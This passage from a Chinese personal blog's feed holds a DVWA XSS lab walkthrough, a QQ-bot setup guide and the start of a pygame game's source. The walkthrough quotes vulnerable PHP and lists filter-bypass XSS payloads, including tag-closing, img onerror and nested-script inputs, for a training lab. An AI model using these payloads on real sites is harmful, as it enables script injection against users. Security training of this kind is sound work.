document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);                        document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + $decodeURI(lang) + &quot;&lt;/option&gt;&quot;);                        document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;);                    }                    document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;);                &lt;/script&gt;            &lt;/select&gt;            &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt;        &lt;/form&gt;&lt;/div&gt;</code></pre><h5 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h5><p>lang变量通过document.location.href来获取url，并没有过滤就输入到了option标签中<br><img src="https://Lmg66.github.io/img/111.png" alt="图片"><br><img src="https://Lmg66.github.io/img/112.png" alt="图片"></p><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><p><img src="https://Lmg66.github.io/img/113.png" alt="图片"></p><h4 id="级别-Medium-1"><a href="#级别-Medium-1" class="headerlink" title="级别:Medium"></a>级别:Medium</h4><h5 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    $default = $_GET[&#39;default&#39;];    # Do not allow script tags    if (stripos ($default, &quot;&lt;script&quot;) !== false) {        header (&quot;location: ?default=English&quot;);        exit;    }}?&gt;</code></pre><h5 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h5><p>对default变量进行了过滤，通过stripos()函数查找&lt;scr/ipt&gt;在default中的位置(不区分大小写)，如果匹配到，则变为default=English,但是可以使用其他标签来绕过，先要闭合</option>和</select>标签<br><img src="https://Lmg66.github.io/img/114.png" alt="图片"><br><img src="https://Lmg66.github.io/img/115.png" alt="图片"></p><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><pre><code>/vulnerabilities/xss_d/?default=English &lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;/vulnerabilities/xss_d/?default=English&lt;input onclick=alert(&#39;XSS&#39;) /&gt;</code></pre><p><img src="https://Lmg66.github.io/img/116.png" alt="图片"><br><img src="https://Lmg66.github.io/img/117.png" alt="图片"></p><h4 id="级别-high-1"><a href="#级别-high-1" class="headerlink" title="级别:high"></a>级别:high</h4><h5 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    # White list the allowable languages    switch ($_GET[&#39;default&#39;]) {        case &quot;French&quot;:        case &quot;English&quot;:        case &quot;German&quot;:        case &quot;Spanish&quot;:            # ok            break;        default:            header (&quot;location: ?default=English&quot;);            exit;    }}?&gt;</code></pre><h5 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h5><p>使用白名单，进行匹配，如果值不为就default=English，但是只是对default进行了过滤，可以使用其他变量，document.location.href来获取url，仍然会输出到标签中显示，当然也可以用注释符号#</p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h5><pre><code>/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;/vulnerabilities/xss_d/?default=English&amp;a=?default=English&amp;a=&lt;input onclick=alert(&#39;XSS&#39;) /&gt;/vulnerabilities/xss_d/?default=English#&lt;input onclick=alert(&#39;XSS&#39;) /&gt;/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;)</code></pre><p><img src="https://Lmg66.github.io/img/118.png" alt="图片"><br><img src="https://Lmg66.github.io/img/119.png" alt="图片"><br><img src="https://Lmg66.github.io/img/120.png" alt="图片"><br><img src="https://Lmg66.github.io/img/121.png" alt="图片"></p><h4 id="级别-impossible-1"><a href="#级别-impossible-1" class="headerlink" title="级别:impossible"></a>级别:impossible</h4><h5 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code># For the impossible level, don&#39;t decode the querystring$decodeURI = &quot;decodeURI&quot;;if ($vulnerabilityFile == &#39;impossible.php&#39;) {    $decodeURI = &quot;&quot;;}</code></pre><h5 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h5><p>如果是impossible难度则decodeURI=””，意思就是不解码，那么标签就会被过滤，无法闭合标签和创建新标签，所以无法xss<br><img src="https://Lmg66.github.io/img/122.png" alt="图片"></p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><h4 id="级别-low-1"><a href="#级别-low-1" class="headerlink" title="级别:low"></a>级别:low</h4><h5 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="分析-trim-函数-stripslashes-函数-mysqli-real-escape-string-函数只是对-类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss"><a href="#分析-trim-函数-stripslashes-函数-mysqli-real-escape-string-函数只是对-类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss" class="headerlink" title="分析:trim()函数 stripslashes() 函数 mysqli_real_escape_string() 函数只是对/类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss"></a>分析:trim()函数 stripslashes() 函数 mysqli_real_escape_string() 函数只是对/类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss</h5><p><img src="https://Lmg66.github.io/img/123.png" alt="图片"><br><img src="https://Lmg66.github.io/img/124.png" alt="图片"><br><img src="https://Lmg66.github.io/img/125.png" alt="图片"></p><h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><pre><code>name:Lmg66message:&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/126.png" alt="图片"></p><h4 id="级别-medium"><a href="#级别-medium" class="headerlink" title="级别:medium"></a>级别:medium</h4><h5 id="查看源码-9"><a href="#查看源码-9" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h5><p>对name用str_replace()是区分大小写的，可以大写绕过，只是匹配了一次可以嵌套绕过，也可以使用其他的标签<br>对message，addslashes()函数在预定字符加/，strip_tags()函数剥去字符串中HTML，XML，以及php标签，htmlspecialchars()函数预定的函数转换为HTML实体，基本都过滤和转义了，所以突破name变量，name变量限制了输出长度，要F12更改name的maxlength<br><img src="https://Lmg66.github.io/img/127.png" alt="图片"><br><img src="https://Lmg66.github.io/img/128.png" alt="图片"><br><img src="https://Lmg66.github.io/img/129.png" alt="图片"><br><img src="https://Lmg66.github.io/img/130.png" alt="图片"></p><h5 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h5><pre><code>name:&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;message:Lmg66name:&lt;s&lt;script&gt;cript&gt;alert(&#39;xss&#39;)&lt;/script&gt;message:Lmg66name:&lt;img src=&#39;xss&#39; onerror=alert(&#39;xss&#39;)&gt;message:Lmg66</code></pre><h4 id="级别-high-2"><a href="#级别-high-2" class="headerlink" title="级别:high"></a>级别:high</h4><h5 id="查看源码-10"><a href="#查看源码-10" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="分析-9"><a href="#分析-9" class="headerlink" title="分析:"></a>分析:</h5><p>对message和上一个一样，没希望突破，对name来说preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name )之前反射型xss见过，不区分大小写，通配符过滤，可以使用其他标签,name同样限制了长度，F12改一下maxlength=”100”</p><h5 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h5><pre><code>name:&lt;img src=&#39;xss&#39; onerror=alert(&#39;xss&#39;)&gt;message:Lmg66</code></pre><h4 id="级别-impossible-2"><a href="#级别-impossible-2" class="headerlink" title="级别:impossible"></a>级别:impossible</h4><h5 id="查看源码-11"><a href="#查看源码-11" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><h5 id="分析-10"><a href="#分析-10" class="headerlink" title="分析:"></a>分析:</h5><p>对name和message都进行了严格过滤</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qq机器人</title>
      <link href="/posts/e895.html"/>
      <url>/posts/e895.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>在其他群看见qq机器人很好玩，就打算自己做一个，想让其推送网站的文章，方便阅读</p><h2 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h2><p>为了让qq机器人能24小时运行建议搭建在服务器上或者vps上</p><p>手里刚好有个服务器我就搭建在服务器上了</p><p>服务器环境：centos7</p><h2 id="准备配置环境"><a href="#准备配置环境" class="headerlink" title="准备配置环境"></a>准备配置环境</h2><h3 id="安装宝塔"><a href="#安装宝塔" class="headerlink" title="安装宝塔"></a>安装宝塔</h3><p>因为是centos系统没有图形化页面，个人建议安装宝塔(如果你Linux命令很熟悉可以跳过)</p><p>安装方法：<a href="https://www.bt.cn/bbs/thread-19376-1-1.html" target="_blank" rel="noopener">https://www.bt.cn/bbs/thread-19376-1-1.html</a></p><p>找到自己对应的系统，复制安装代码到虚拟终端，回车即可</p><p>等待一会终端出现一个ip地址(就是你服务器的ip+8888好像)和账号密码访问登录到宝塔</p><p>按照我选择的安装插件即可(建议：编译安装)</p><p><img src="https://Lmg66.github.io/img/72.png" alt="图片"></p><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>酷q要运行在docker里</p><h4 id="安装方法一-通过宝塔安装"><a href="#安装方法一-通过宝塔安装" class="headerlink" title="安装方法一(通过宝塔安装)"></a>安装方法一(通过宝塔安装)</h4><p>宝塔页面软件商城搜索docker，安装即可</p><p><img src="https://Lmg66.github.io/img/73.png" alt="图片"></p><h4 id="安装方法二-命令行安装"><a href="#安装方法二-命令行安装" class="headerlink" title="安装方法二(命令行安装)"></a>安装方法二(命令行安装)</h4><p>安装方法：<a href="https://www.runoob.com/docker/centos-docker-install.html" target="_blank" rel="noopener">https://www.runoob.com/docker/centos-docker-install.html</a><br>找到自己对应的系统，复制安装代码到虚拟终端，回车即可</p><h3 id="安装python3-gt-3-7"><a href="#安装python3-gt-3-7" class="headerlink" title="安装python3&gt;=3.7"></a>安装python3&gt;=3.7</h3><p>因为酷q中的cqhttp插件需要python3环境这里顺便安装了</p><p>安装方法(centos7系统)：<a href="https://blog.csdn.net/u013214212/article/details/81540840" target="_blank" rel="noopener">https://blog.csdn.net/u013214212/article/details/81540840</a></p><p>注意：有的系统自带的有python2或者python3，建议百度按照自己系统安装或升级python3.7以上的方法</p><h2 id="安装酷q"><a href="#安装酷q" class="headerlink" title="安装酷q"></a>安装酷q</h2><p>终端命令pull 酷Q的镜像：</p><pre><code>docker pull coolq/wine-coolq</code></pre><p>如果拉取镜像比较慢，可以尝试换源</p><p>换源参考文章：<a href="https://www.cnblogs.com/Neeo/articles/12726262.html" target="_blank" rel="noopener">https://www.cnblogs.com/Neeo/articles/12726262.html</a></p><p>创建用于存放coolQ数据的文件夹：</p><pre><code>mkdir /root/coolq-data</code></pre><p>然后运行 酷 Q 镜像：</p><pre><code>docker run --name=coolq -d -p 8080:9000 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=10000 coolq/wine-coolq</code></pre><p>其中 VNC_PASSWD 指定链接 VNC 密码，远程访问酷 Q 界面时要用到，COOLQ_ACCOUNT 指的是酷 Q 默认登录密码</p><p>登录酷 Q 界面，在浏览器输入你服务器ip+9000，访问输入 vnc 密码后就可以看到酷 Q 登录界面了</p><h3 id="docker的酷q的运维"><a href="#docker的酷q的运维" class="headerlink" title="docker的酷q的运维"></a>docker的酷q的运维</h3><h4 id="方法一-命令行-："><a href="#方法一-命令行-：" class="headerlink" title="方法一(命令行)："></a>方法一(命令行)：</h4><p>查看酷 Q 运行情况，主要是酷 Q 运行中产生的日志，可以用来排错</p><pre><code>docker logs coolq</code></pre><p>启动和停止酷 Q</p><pre><code>docker start coolqdocker stop coolq</code></pre><h4 id="方法二-宝塔"><a href="#方法二-宝塔" class="headerlink" title="方法二(宝塔):"></a>方法二(宝塔):</h4><p>docker管理器即可</p><p><img src="https://Lmg66.github.io/img/73.png" alt="图片"></p><h2 id="安装nonebot-cqhttp-个性化定制你的qq机器人"><a href="#安装nonebot-cqhttp-个性化定制你的qq机器人" class="headerlink" title="安装nonebot cqhttp 个性化定制你的qq机器人"></a>安装nonebot cqhttp 个性化定制你的qq机器人</h2><p>参考nonebot官网:<a href="https://nonebot.cqp.moe/" target="_blank" rel="noopener">https://nonebot.cqp.moe/</a></p><p>注：官网是最好的教程</p><h2 id="挂起脚本，实现24小时运行"><a href="#挂起脚本，实现24小时运行" class="headerlink" title="挂起脚本，实现24小时运行"></a>挂起脚本，实现24小时运行</h2><p>ssh连接，断开的时候，python脚本也会断开，解决这个问题需要将脚本后台挂起</p><p>进入程序入口，挂起命令</p><pre><code>nohup python bot.py &amp;</code></pre><p>然后回车即可，会看见一个id，就是后台运行id,若要关掉需要使用</p><pre><code>ps -aux</code></pre><p>可以找到你运行的进程id，然后用命令关掉</p><pre><code>kill id</code></pre><h2 id="个人qq机器人-已经开源"><a href="#个人qq机器人-已经开源" class="headerlink" title="个人qq机器人(已经开源)"></a>个人qq机器人(已经开源)</h2><p>开源地址:<a href="https://github.com/Lmg66/QQrobot" target="_blank" rel="noopener">https://github.com/Lmg66/QQrobot</a></p><p>实现的功能</p><p> 1.天气，食用方法”小安+天气” </p><pre><code>文件目录：plugins/weather</code></pre><p> 2.图灵对话，食用方+你想说的话” </p><pre><code> plugins/tuling.py</code></pre><p> 3.信息的获取，食用方法”小安+碧蓝航线”还可以+知乎+steam+新番+<em>年</em>月有什么新番+先知社区 </p><pre><code> plugins下看文件的命名基本都是功能</code></pre><p> 4.游戏功能,食用方法”小安+谁是卧底”—-&gt;测试ing  </p><p> 5.以图搜番，食用方法”小安+以图搜番”</p><pre><code>  plugins/anime_search_photo.py</code></pre><p> 6.音乐功能,食用方法”小安+来首”——&gt;此处有bug不建议食用会让小安卡住 </p><pre><code> plugins/musice</code></pre><p> 7.早安，午安，晚安  </p><pre><code> plugins/one_talk</code></pre><p> 还有隐藏功能哦，不妨输入”小安+来个涩图”试试有惊喜哦，嘻嘻嘻’)</p>]]></content>
      
      
      <categories>
          
          <category> qq机器人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qq机器人的搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python小游戏-水文</title>
      <link href="/posts/5fc7.html"/>
      <url>/posts/5fc7.html</url>
      
        <content type="html"><![CDATA[<h4 id="脚本不会，全都白费。所以就去学习了简单的python，结果不慎学了python中的pygame，浪费了不少时间，没啥用如果不做游戏个人觉得最好别学，学爬虫她不香吗？不过也有一点收获，打飞机小游戏，源码奉上（注意：安装pygame库哦！！！）"><a href="#脚本不会，全都白费。所以就去学习了简单的python，结果不慎学了python中的pygame，浪费了不少时间，没啥用如果不做游戏个人觉得最好别学，学爬虫她不香吗？不过也有一点收获，打飞机小游戏，源码奉上（注意：安装pygame库哦！！！）" class="headerlink" title="脚本不会，全都白费。所以就去学习了简单的python，结果不慎学了python中的pygame，浪费了不少时间，没啥用如果不做游戏个人觉得最好别学，学爬虫她不香吗？不过也有一点收获，打飞机小游戏，源码奉上（注意：安装pygame库哦！！！）"></a>脚本不会，全都白费。所以就去学习了简单的python，结果不慎学了python中的pygame，浪费了不少时间，没啥用如果不做游戏个人觉得最好别学，学爬虫她不香吗？不过也有一点收获，打飞机小游戏，源码奉上（注意：安装pygame库哦！！！）</h4><h4 id="python学习地址：https-www-bilibili-com-video-BV1ex411x7Em-from-search-amp-seid-16707064392510899029"><a href="#python学习地址：https-www-bilibili-com-video-BV1ex411x7Em-from-search-amp-seid-16707064392510899029" class="headerlink" title="python学习地址：https://www.bilibili.com/video/BV1ex411x7Em?from=search&amp;seid=16707064392510899029"></a>python学习地址：<a href="https://www.bilibili.com/video/BV1ex411x7Em?from=search&amp;seid=16707064392510899029" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1ex411x7Em?from=search&amp;seid=16707064392510899029</a></h4><h4 id="文件命名为plane-main-py"><a href="#文件命名为plane-main-py" class="headerlink" title="文件命名为plane_main.py"></a>文件命名为plane_main.py</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pygame<span class="token keyword">from</span> plane_sprites <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">PlaneGame</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># </span><span class="token triple-quoted-string string">"""飞机大战主游戏"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"游戏初始化..."</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 1.创建游戏窗口,宽度x和高度y,常量SCREEN_RECT = pygame.Rect(0, 0, 480, 700)，SCREEN_RECT.size=(480,700)</span>        self<span class="token punctuation">.</span>screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>SCREEN_RECT<span class="token punctuation">.</span>size<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.创建游戏的时钟</span>        self<span class="token punctuation">.</span>clock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 3.调用私有方法，精灵和精灵组的创建</span>        self<span class="token punctuation">.</span>__create_sprites<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 4.设置定时时间 - 创建敌机 1s，CREATE_ENEMY_EVENT创建敌机频率，HERO_FIRE_EVENT发射子弹频率</span>        pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>set_timer<span class="token punctuation">(</span>CREATE_ENEMY_EVENT<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>        pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>set_timer<span class="token punctuation">(</span>HERO_FIRE_EVENT<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__create_sprites</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 创建背景精灵和精灵组，调用plane_sprites的Background()类</span>        bg1 <span class="token operator">=</span> Background<span class="token punctuation">(</span><span class="token punctuation">)</span>        bg2 <span class="token operator">=</span> Background<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>back_ground <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span>bg1<span class="token punctuation">,</span> bg2<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 创建敌机的精灵组</span>        self<span class="token punctuation">.</span>enemy_group <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 创建英雄的精灵和精灵组</span>        self<span class="token punctuation">.</span>hero <span class="token operator">=</span> Hero<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hero_group <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hero<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">start_game</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"游戏开始..."</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 1.设置刷新帧率</span>            self<span class="token punctuation">.</span>clock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>FRAME_PER_SEC<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 2.事件监听</span>            self<span class="token punctuation">.</span>__event_handler<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 3.碰撞检测</span>            self<span class="token punctuation">.</span>__check_collide<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 4.更新/绘制精灵组</span>            self<span class="token punctuation">.</span>__update_sprites<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 5.更新刷新显示</span>            pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__event_handler</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 判断是否点×退出游戏</span>            <span class="token keyword">if</span> event<span class="token punctuation">.</span>type <span class="token operator">==</span> pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>                PlaneGame<span class="token punctuation">.</span>__game_over<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> event<span class="token punctuation">.</span>type <span class="token operator">==</span> CREATE_ENEMY_EVENT<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"敌机出场..."</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 1.创建敌机精灵</span>                enemy <span class="token operator">=</span> Enemy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 